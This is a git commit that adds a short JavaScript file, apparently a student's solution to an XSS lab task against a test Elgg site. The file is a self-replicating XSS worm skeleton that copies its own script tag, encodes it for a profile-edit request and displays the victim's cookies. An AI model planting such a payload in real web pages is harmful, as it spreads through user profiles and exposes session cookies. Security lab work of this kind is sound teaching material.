d1f2578d0ad5ffa3b07718e418b3440203c87803
Yumingyuan <timdavid@vip.qq.com>
2019-04-20 11:19:50 -0400

    finish task5 dom approach

---
+++ 5.5_Task4_dom_approach.js
@@ -0,0 +1,10 @@
+<script id=worm>
+var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+var jsCode = document.getElementById("worm").innerHTML;
+var tailTag = "</" + "script>";	
+var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+var sendurl="http://www.xsslabelgg.com/action/profile/edit"
+document.write(document.cookie);
+alert(wormCode);
+</script>
+
